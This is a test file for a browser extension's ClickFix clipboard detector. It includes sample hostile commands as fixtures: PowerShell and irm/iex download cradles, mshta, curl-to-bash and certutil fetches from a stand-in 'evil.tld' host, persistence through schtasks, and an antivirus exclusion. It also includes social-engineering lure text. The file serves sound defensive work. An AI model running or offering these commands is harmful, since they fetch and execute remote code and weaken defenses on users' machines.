import { describe, it, expect } from "vitest";
import {
  classifyClipboardWrite,
  classifyInstructionText,
  assessClickFix,
  SAFE_CLIPBOARD_TEXT,
} from "../../extension/lib/clipboardGuard.js";

describe("classifyClipboardWrite", () => {
  it("flags an encoded PowerShell command", () => {
    const r = classifyClipboardWrite(
      "powershell -nop -w hidden -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0AA==",
    );
    expect(r.malicious).toBe(true);
    expect(r.confidence).toBeGreaterThan(0.85);
    expect(r.preview).not.toContain("\n");
  });
  it("flags an IEX download cradle", () => {
    const r = classifyClipboardWrite(
      "iex (new-object net.webclient).downloadstring('http://evil.tld/a.ps1')",
    );
    expect(r.malicious).toBe(true);
    expect(r.confidence).toBeGreaterThan(0.8);
  });
  it("flags a mshta one-liner", () => {
    expect(classifyClipboardWrite("mshta https://evil.tld/x.hta").malicious).toBe(true);
  });
  it("flags curl piped to bash (macOS/Linux ClickFix)", () => {
    expect(classifyClipboardWrite("curl -fsSL https://evil.tld/i.sh | bash").malicious).toBe(true);
  });
  it("flags a certutil download LOLBin", () => {
    expect(
      classifyClipboardWrite("certutil -urlcache -f http://evil.tld/a.exe a.exe").malicious,
    ).toBe(true);
  });
  it("flags newer download cradles (irm / Invoke-RestMethod)", () => {
    expect(classifyClipboardWrite("irm https://evil.tld/a.ps1 | iex").malicious).toBe(true);
    expect(
      classifyClipboardWrite("Invoke-RestMethod https://evil.tld/p | Invoke-Expression").malicious,
    ).toBe(true);
  });
  it("flags persistence / AV-evasion LOLBins (schtasks, Add-MpPreference)", () => {
    expect(
      classifyClipboardWrite('schtasks /create /tn upd /tr "calc.exe" /sc onlogon').malicious,
    ).toBe(true);
    const r = classifyClipboardWrite("Add-MpPreference -ExclusionPath C:\\Users\\Public");
    expect(r.malicious).toBe(true);
    expect(r.confidence).toBeGreaterThan(0.8); // strong signature
  });
  it("flags a scripting-language download-and-run one-liner", () => {
    expect(
      classifyClipboardWrite(
        "python -c \"import urllib.request;urllib.request.urlopen('http://evil.tld')\"",
      ).malicious,
    ).toBe(true);
  });
  it("does NOT flag a normal copied URL", () => {
    expect(classifyClipboardWrite("https://github.com/kedayam/shield").malicious).toBe(false);
  });
  it("does NOT flag ordinary copied prose", () => {
    expect(classifyClipboardWrite("Here is the meeting link for tomorrow at 3pm.").malicious).toBe(
      false,
    );
  });
  it("ignores short / non-string input", () => {
    expect(classifyClipboardWrite("hi").malicious).toBe(false);
    expect(classifyClipboardWrite(null).malicious).toBe(false);
  });
});

describe("classifyInstructionText", () => {
  it("detects Win+R run-dialog instructions", () => {
    const r = classifyInstructionText(
      "To verify you are human, press Windows + R, then Ctrl+V and press Enter.",
    );
    expect(r.clickFixInstructions).toBe(true);
  });
  it("treats a plain captcha mention alone as non-actionable", () => {
    const r = classifyInstructionText("Please complete the captcha below.");
    expect(r.confidence).toBe(0);
  });
  it("detects newer lure phrasings (⊞ glyph, 'paste this code', fake Ray ID)", () => {
    expect(
      classifyInstructionText("Press ⊞ then paste the code and hit Enter").clickFixInstructions,
    ).toBe(true);
    const r = classifyInstructionText("Checking your browser… Human verification. Ray ID: 8ab2");
    expect(r.fakeVerify).toBe(true);
  });
});

describe("clipboard neutralization", () => {
  it("exports a safe replacement string that is not itself a command", () => {
    expect(typeof SAFE_CLIPBOARD_TEXT).toBe("string");
    expect(classifyClipboardWrite(SAFE_CLIPBOARD_TEXT).malicious).toBe(false);
  });
});

describe("assessClickFix", () => {
  it("returns critical when a command is on the clipboard", () => {
    const v = assessClickFix(
      "powershell -w hidden -nop -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0AA==",
      "Verify you are human: press Win+R and paste, then press Enter.",
    );
    expect(v.severity).toBe("critical");
    expect(v.confidence).toBeGreaterThan(0.85);
  });
  it("returns high for strong textual lure without captured clipboard", () => {
    const v = assessClickFix(
      "",
      "I'm not a robot. Press Windows + R, paste, and hit Enter to continue.",
    );
    expect(v.severity).toBe("high");
  });
  it("returns none for benign pages", () => {
    expect(assessClickFix("hello world", "welcome to our site").severity).toBe("none");
  });
});
